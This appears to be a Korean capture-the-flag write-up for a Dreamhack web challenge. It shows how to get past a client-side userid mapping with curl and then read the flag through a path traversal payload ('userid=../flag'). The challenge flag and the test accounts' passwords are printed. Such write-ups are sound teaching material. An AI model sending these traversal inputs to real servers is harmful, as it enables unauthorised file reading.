---
title: "Dreamhack Index Path Traversal 풀이"
description: "클라이언트 측 변환을 우회하고 경로 탐색 취약점을 확인한다."
category: "Dreamhack Web"
tags: ["Dreamhack","Web","Path Traversal"]
createdAt: "2026-11-03"
updatedAt: "2026-11-03"
draft: false
notionSource: "36657476-16b2-81ac-8f43-ec4f38bfcfe2"
---

문제 사이트에 접속해보면 <code>Path Traversal</code>이라는 제목과 <code>/get_info</code>로 이동하는 링크가 있다.

<code>/get_info</code>에 들어가면 userid를 입력하는 폼이 나오고, 페이지 안에는 이러한 JavaScript 코드가 있다.

```javascript
const users = {
  'guest': 0,
  'admin': 1
}
function user(evt){
  document.getElementById('userid').value = users[document.getElementById('userid').value];
  return true;
}
window.onload = function() {
  document.getElementById('form').addEventListener('submit', user);
}
```

이 코드는 사용자가 <code>guest</code>를 입력하면 <code>0</code>으로, <code>admin</code>을 입력하면 <code>1</code>로 바꿔서 서버에 전송한다.

그런데 이 변환은 브라우저에서만 일어나는 클라이언트 측 코드이기 때문에, curl 같은 도구로 직접 요청을 보내면 원하는 userid 값을 그대로 서버에 전달할 수 있다.

먼저 정상적인 요청을 보내보면 다음과 같이 guest 정보가 나온다.

```bash
curl.exe -X POST -d "userid=0" http://host8.dreamhack.games:12234/get_info
```

```json
{"userid": "guest", "level": 1, "password": "guest"}
```

admin 값인 <code>1</code>을 넣으면 admin 정보도 확인할 수 있다.

```bash
curl.exe -X POST -d "userid=1" http://host8.dreamhack.games:12234/get_info
```

```json
{"userid": "admin", "level": 9999, "password": "admin"}
```

여기서 문제 이름이 <code>Path Traversal</code>이고, userid 값으로 숫자를 넣었을 때 서버가 해당 사용자 정보를 읽어오는 것을 보면 서버 내부에서 userid 값을 파일 이름이나 경로처럼 사용하고 있다고 추측할 수 있다.

그래서 상위 디렉터리로 이동하는 <code>../</code>를 사용해 flag 파일을 읽어보았다.

익스플로잇 코드:

```bash
curl.exe -X POST --data-urlencode "userid=../flag" http://host8.dreamhack.games:12234/get_info
```

실행하면 응답의 <code><pre></code> 태그 안에 플래그가 출력된다.

```txt
DH{8a33bb6fe0a37522bdc8adb65116b2d4}
```

이렇게 플래그를 얻을 수 있다.

